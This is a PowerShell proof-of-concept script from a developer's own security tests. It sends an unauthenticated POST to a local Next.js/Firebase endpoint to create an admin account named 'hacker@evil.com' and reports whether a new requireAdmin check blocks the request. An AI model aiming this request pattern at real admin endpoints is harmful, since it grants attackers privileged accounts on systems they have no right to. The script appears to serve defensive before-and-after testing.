# =====================================================================
#  Attack 01 - Unauthenticated Admin Creation
#
#  Target  : POST http://localhost:3000/api/admin/create-user
#  Premise : The route blindly trusts whoever calls it. No bearer token,
#            no role check. A single anonymous HTTP POST creates a
#            Firebase Auth user AND writes a Firestore users/{uid} doc
#            with role of caller's choice (we pick "admin").
#
#  Run:
#       cd C:\Users\vssva\OneDrive\Desktop\LogiXair
#       npm run dev                               # terminal 1
#       .\attacks\01_create_admin_unauthenticated\attack.ps1   # terminal 2
#
#  Success looks like:
#       success : True   uid : <some-uid>
#       => Firebase Console > Authentication: hacker@evil.com exists
#       => Firebase Console > Firestore users/<uid>: role = "admin"
#
#  After protection (lib/security/requireAdmin.ts wired into the route):
#       status  : 401
#       error   : Missing or malformed Authorization header
# =====================================================================

$target = "http://localhost:3000/api/admin/create-user"

$payload = @{
    email    = "hacker@evil.com"
    password = "Hack@1234"
    role     = "admin"
    stations = @()
} | ConvertTo-Json -Compress

Write-Host ""
Write-Host "--- ATTACK 01: Unauthenticated Admin Creation ---" -ForegroundColor Yellow
Write-Host "Target : $target"
Write-Host "Payload: $payload"
Write-Host ""

try {
    $response = Invoke-WebRequest `
        -Uri $target `
        -Method POST `
        -ContentType "application/json" `
        -Body $payload `
        -UseBasicParsing `
        -ErrorAction Stop

    Write-Host "HTTP Status : $($response.StatusCode)" -ForegroundColor Cyan
    Write-Host "Response    : $($response.Content)"

    if ($response.Content -match '"success"\s*:\s*true') {
        Write-Host ""
        Write-Host "[!] ATTACK SUCCEEDED - the endpoint is unprotected."        -ForegroundColor Red
        Write-Host "    A new admin account 'hacker@evil.com' was created."     -ForegroundColor Red
        Write-Host "    Verify in Firebase Console > Authentication."           -ForegroundColor Red
    }
    else {
        Write-Host ""
        Write-Host "[OK] Attack blocked at the application layer." -ForegroundColor Green
    }
}
catch {
    $resp = $_.Exception.Response
    if ($null -ne $resp) {
        $stream = $resp.GetResponseStream()
        $reader = New-Object System.IO.StreamReader($stream)
        $body   = $reader.ReadToEnd()
        Write-Host "HTTP Status : $([int]$resp.StatusCode)" -ForegroundColor Cyan
        Write-Host "Response    : $body"
        Write-Host ""
        Write-Host "[OK] Attack blocked - server rejected the request." -ForegroundColor Green
    }
    else {
        Write-Host ""
        Write-Host "[!!] Could not reach $target" -ForegroundColor Red
        Write-Host "     Is the dev server running?  npm run dev" -ForegroundColor Red
        Write-Host $_.Exception.Message
    }
}
